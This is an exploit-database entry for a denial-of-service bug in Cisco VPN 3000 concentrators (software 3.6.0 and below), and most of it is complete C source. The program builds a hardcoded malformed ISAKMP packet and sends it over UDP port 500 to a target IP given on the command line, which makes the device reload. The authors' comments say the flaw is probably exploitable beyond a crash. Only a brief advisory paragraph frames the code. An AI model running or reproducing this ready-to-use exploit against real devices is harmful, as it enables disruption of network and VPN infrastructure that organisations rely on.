source: http://www.securityfocus.com/bid/5620/info

Cisco VPN 3000 series concentrators are prone to a denial of service condition when receiving an overly long username string during authentication from a VPN client.

Successful exploitation will cause the device to reload. 

/* ISAKMP Cisco VPN Concentrator DoS 
 * by nowin of Phenoelit <nowin@phenoelit.de>
 *    FX of Phenoelit <fx@phenoelit.de>
 * http://www.phenoelit.de
 * (C) 2002 
 *
 * Cisco VPN Concentrator 3000 Series, Software <=3.6.0 
 * Single Packet Denial of Service. 
 * The device will reboot upon receiving this packet.
 * This is probalby exploitable, but we don't have a Concentrator to test.
 *
 * Greets are in the packet.
 */

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>

#define SPLASH          \
        "Phenoelit Cisco VPN Killer\n" \
	" Cisco VPN Concentrator 3000 DoS (3.6.0 and below)\n" \
	" (C) 2002 - nowin of Phenoelit <nowin@phenoelit.de>\n" \
	"            FX of Phenoelit <fx@phenoelit.de>\n"


struct {
    struct in_addr	dest;
    int			sfd;
} cfg;


void *smalloc(size_t s);
int send500(char *packet, int len);


char	fixed_ISAKMP[] =
	"\xf0\x0d\xf0\x0d\xf0\x0d\xf0\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x01"
	"\x10\x04\x00\x00\x00\x00\x00\x00\x00\x0F\xFF\x04\x00\x01\x34\x00\x00"
	"\x00\x01\x00\x00\x00\x01\x00\x00\x01\x28\x01\x01\x00\x08\x03\x00\x00"
	"\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x04\x00\x02"
	"\x80\x03\xfd\xe9\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x03"
	"\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x04"
	"\x00\x02\x80\x03\xfd\xe9\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4"
	"\x9b\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02"
	"\x80\x04\x00\x02\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00"
	"\x20\xc4\x9b\x03\x00\x00\x24\x04\x01\x00\x00\x80\x01\x00\x05\x80\x02"
	"\x00\x01\x80\x04\x00\x02\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00"
	"\x04\x00\x20\xc4\x9b\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x01"
	"\x80\x02\x00\x02\x80\x04\x00\x02\x80\x03\xfd\xe9\x80\x0b\x00\x01\x00"
	"\x0c\x00\x04\x00\x20\xc4\x9b\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01"
	"\x00\x01\x80\x02\x00\x01\x80\x04\x00\x02\x80\x03\xfd\xe9\x80\x0b\x00"
	"\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x03\x00\x00\x24\x03\x01\x00\x00"
	"\x80\x01\x00\x01\x80\x02\x00\x02\x80\x04\x00\x02\x80\x03\x00\x01\x80"
	"\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x00\x00\x00\x24\x04\x01"
	"\x00\x00\x80\x01\x00\x01\x80\x02\x00\x01\x80\x04\x00\x02\x80\x03\x00"
	"\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x0a\x00\x00\x84"
	"\x41\x6E\x64\x20\x50\x68\x65\x6E\x6F\x65\x6C\x69\x74\x20\x73\x61\x79"
	"\x73\x3A\x20\x54\x68\x69\x73\x20\x62\x75\x67\x20\x69\x73\x20\x61\x77"
	"\x61\x72\x64\x65\x64\x20\x74\x6F\x20\x53\x65\x61\x6E\x20\x43\x6F\x6E"
	"\x76\x65\x72\x79\x20\x66\x6F\x72\x20\x65\x78\x63\x65\x6C\x6C\x65\x6E"
	"\x63\x65\x20\x69\x6E\x20\x63\x6F\x70\x79\x20\x61\x6E\x64\x20\x70\x61"
	"\x73\x74\x65\x2E\x20\x47\x72\x65\x65\x74\x73\x3A\x20\x48\x61\x6C\x76"
	"\x61\x72\x2C\x52\x69\x6C\x65\x79\x2C\x4E\x69\x63\x6F\x26\x53\x65\x62"
	"\x61\x73\x74\x69\x65\x6E\x2E\x2E\x2E"
	"\x05\x00\x00\x18 -==| PHENOELIT |==-" 
	"\x00\x00\x00\x04\x0b\x11\x01\xf4 Eat this and die!"
	;


int main(int argc, char **argv) {
    char		option;
    extern char		*optarg;

    int			plen;
    char		*c;


    printf("%s\n",SPLASH);

    memset(&cfg,0,sizeof(cfg));
    while ((option=getopt(argc,argv,"d:"))!=EOF) {
	switch (option) {
	    case 'd':	if (inet_aton(optarg,&(cfg.dest))==0) {
			    fprintf(stderr,"Address of -d argument not IP\n");
			    return (1);
			}
			break;
	    default:	fprintf(stderr,"%s -d <ip_address>\n",argv[0]);
			return (1);
	}
    } 

    if (!(*((u_int32_t *)&(cfg.dest)))) {
	fprintf(stderr,"%s -d <ip_address>\n",argv[0]);
	return (1);
    }

    plen=sizeof(fixed_ISAKMP)-1;
    c=(char *)smalloc(plen);
    memcpy(c,fixed_ISAKMP,sizeof(fixed_ISAKMP)-1);

    send500(c,plen);

    printf("Packet sent.\n");

    free (c);
    return 0;
}


int send500(char *packet, int len) {
    struct sockaddr_in	sin;

    if ((cfg.sfd=socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP))<0) {
	perror("socket()");
	return (-1);
    }

    memset(&sin,0,sizeof(struct sockaddr_in));
    sin.sin_family=PF_INET;
    sin.sin_port=htons(500);
    memcpy(&(sin.sin_addr),&(cfg.dest),sizeof(sin.sin_addr));
    if (sendto(cfg.sfd,packet,len,0,
		(struct sockaddr *)&sin,
		sizeof(struct sockaddr_in))<=0) {
	perror("sendto()");
	return (-1);
    }

    return (0);

}

void *smalloc(size_t s) {
    void *p;

    if ((p=malloc(s))==NULL) {
	fprintf(stderr,"smalloc(): fatal! Allocation of %u bytes failed\n",s);
	exit (-1);
    }
    memset(p,0,s);
    return p;
}
